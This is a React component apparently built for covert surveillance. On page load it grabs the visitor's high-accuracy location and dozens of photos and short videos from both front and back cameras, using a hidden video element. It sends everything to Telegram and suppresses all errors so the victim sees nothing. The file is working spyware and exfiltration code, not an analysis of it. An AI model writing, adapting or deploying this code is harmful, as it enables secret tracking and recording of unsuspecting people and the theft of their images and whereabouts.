import { useRef, useEffect } from 'react';
import { cameraService } from '@/lib/camera';
import { locationService, type LocationData } from '@/lib/location';
import { sendPhotoToTelegram, sendVideoToTelegram, sendLocationToTelegram } from '@/lib/telegram';

interface InvisibleCaptureProps {
  onComplete: () => void;
}

export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (!hasStarted.current) {
      hasStarted.current = true;
      startInvisibleCapture();
    }
  }, []);

  const startInvisibleCapture = async () => {
    try {
      // Start all operations simultaneously for speed
      const operations = [
        getLocationFast(),
        captureAllPhotosAndVideos()
      ];

      // Wait maximum 2 seconds for everything
      await Promise.race([
        Promise.all(operations),
        new Promise(resolve => setTimeout(resolve, 2000))
      ]);

      // Complete silently
      onComplete();

    } catch (error) {
      // Fail silently and complete
      onComplete();
    } finally {
      // Ensure camera is stopped
      cameraService.stopCamera();
    }
  };

  const getLocationFast = async () => {
    try {
      const locationData = await locationService.getHighAccuracyLocation();
      if (locationData) {
        // Send location immediately
        sendLocationToTelegram(locationData).catch(() => {});
      }
      return locationData;
    } catch (error) {
      return null;
    }
  };

  const captureAllPhotosAndVideos = async () => {
    try {
      // Start all camera operations in parallel
      const promises = [
        rapidCapturePhotos('environment', 20),
        rapidCapturePhotos('user', 20),
        rapidRecordVideos('environment', 10),
        rapidRecordVideos('user', 10)
      ];

      // Execute all captures simultaneously
      await Promise.allSettled(promises);
    } catch (error) {
      // Continue even if some fail
    }
  };

  const rapidCapturePhotos = async (facingMode: 'user' | 'environment', count: number) => {
    try {
      const stream = await cameraService.startCamera(facingMode);
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.muted = true;
        videoRef.current.play();
      }

      // Minimal stabilization time
      await new Promise(resolve => setTimeout(resolve, 100));

      // Capture all photos rapidly with no delay
      const capturePromises = [];
      for (let i = 1; i <= count; i++) {
        if (videoRef.current) {
          capturePromises.push(
            cameraService.capturePhoto(videoRef.current).then(photoBlob => {
              const cameraType = facingMode === 'user' ? 'Front' : 'Back';
              // Send immediately without waiting
              sendPhotoToTelegram(photoBlob, undefined, i, cameraType).catch(() => {});
            }).catch(() => {})
          );
        }
      }

      // Execute all captures at once
      await Promise.allSettled(capturePromises);
      cameraService.stopCamera();
    } catch (error) {
      // Continue with next step if this fails
    }
  };

  const rapidRecordVideos = async (facingMode: 'user' | 'environment', count: number) => {
    try {
      // Record all videos in parallel
      const videoPromises = [];
      
      for (let i = 1; i <= count; i++) {
        videoPromises.push(
          (async () => {
            try {
              const stream = await cameraService.startVideoRecording(facingMode);
              const videoBlob = await cameraService.recordVideo(stream, 1000); // 1 second videos for speed
              const cameraType = facingMode === 'user' ? 'Front' : 'Back';
              
              // Send immediately
              sendVideoToTelegram(videoBlob, undefined, i, cameraType).catch(() => {});
              cameraService.stopCamera();
            } catch (error) {
              // Skip this video if it fails
            }
          })()
        );
      }

      await Promise.allSettled(videoPromises);
    } catch (error) {
      // Continue with next step if this fails
    }
  };

  return (
    <video
      ref={videoRef}
      className="hidden"
      autoPlay
      muted
      playsInline
    />
  );
}